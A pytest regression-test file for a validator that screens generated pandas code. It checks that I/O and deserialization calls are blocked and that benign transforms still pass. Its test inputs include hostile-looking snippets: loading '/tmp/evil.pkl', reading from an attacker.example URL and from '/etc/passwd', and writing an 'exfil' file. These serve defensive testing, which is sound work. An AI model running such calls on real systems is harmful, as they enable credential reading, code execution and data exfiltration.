"""Regression tests for the generated-code safety audit and sandbox honesty.

Covers audit finding #3 (security-app bucket):
  * ``_validate_code_safety`` must reject pandas/numpy I/O and deserialization
    method calls (``pd.read_pickle``, ``pd.read_csv``, ``df.to_csv`` ...) that
    would otherwise escape the in-process namespace restriction.
  * The advertised ``container`` / ``vm`` sandbox modes must refuse to run
    rather than silently executing the generated code in-process.

The modules are loaded directly from their file paths so the tests stay
hermetic (no Streamlit runtime, no network, no cluster).
"""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

_SUPPORT_PATH = (
    Path(__file__).resolve().parents[1] / "pipeline" / "pipeline_ai_support.py"
)


def _load_support():
    spec = importlib.util.spec_from_file_location(
        "agilab_pipeline_ai_support_under_test", _SUPPORT_PATH
    )
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


support = _load_support()


@pytest.mark.parametrize(
    "snippet",
    [
        "df = pd.read_pickle('/tmp/evil.pkl')",  # deserialization RCE
        "df = pd.read_csv('http://attacker.example/steal')",  # network/file read
        "df = pd.read_json('/etc/passwd')",
        "df = pd.read_parquet('s3://x/y')",
        "df.to_csv('/tmp/exfil.csv')",  # arbitrary write
        "df.to_pickle('/tmp/out.pkl')",
        "x = df['col'].to_csv()",  # attribute call on any receiver
        "df = pd.read_html('http://x')[0]",
        "df.to_sql('t', con)",
    ],
)
def test_io_and_deserialization_calls_are_rejected(snippet):
    with pytest.raises(support._UnsafeCodeError):
        support._validate_code_safety(snippet)


@pytest.mark.parametrize(
    "snippet",
    [
        "df['double'] = df['value'] * 2",
        "df = df.sort_values('value')",
        "df['rolling'] = df['value'].rolling(3).mean()",
        "df = df.groupby('key').sum()",
    ],
)
def test_benign_dataframe_transforms_still_pass(snippet):
    # Must not regress: legitimate in-memory transforms are still allowed.
    support._validate_code_safety(snippet)


def test_exec_helper_rejects_io_escape_before_running():
    import pandas as pd

    df = pd.DataFrame({"value": [1, 2, 3]})
    result, err = support._exec_code_on_df("df.to_csv('/tmp/should_not_write.csv')", df)
    assert result is None
    assert "not allowed" in err.lower() or "safety check failed" in err.lower()
